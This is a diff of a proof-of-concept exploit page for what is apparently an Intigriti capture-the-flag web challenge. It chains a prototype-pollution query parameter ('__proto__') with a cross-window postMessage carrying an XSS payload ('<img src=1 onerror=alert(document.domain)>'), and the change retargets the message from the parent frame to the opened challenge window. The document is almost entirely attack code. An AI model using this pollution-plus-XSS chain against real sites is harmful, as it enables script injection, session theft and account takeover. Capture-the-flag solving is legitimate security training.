@@ -3,7 +3,7 @@
   <script>
     var chal = window.open("https://challenge-0424.intigriti.io/private/play.html?gameId=/challenge/game_barspacer.html&__proto__=a%26debug%3dtrue%26gameId%3d/challenge/game_debug.html%253faction%253dgotoNextGame%2526timeOut%253d3000", "mozillaWindow");
     
-    parent.postMessage({action: "gotoNextGame", delayedMessage: "<img src=1 onerror=alert(document.domain) />", nextGameId: '%'},"*");
+    chal.postMessage({action: "gotoNextGame", delayedMessage: "<img src=1 onerror=alert(document.domain) />", nextGameId: '%'},"*");
 //    setTimeout(() => {
 //    parent.postMessage({action: "displayDelayedMessage", delayedMessage: "<img src=1 onerror=alert(document.domain) />", crash: 5000000000000000n},"*");
 //        }, 1500);
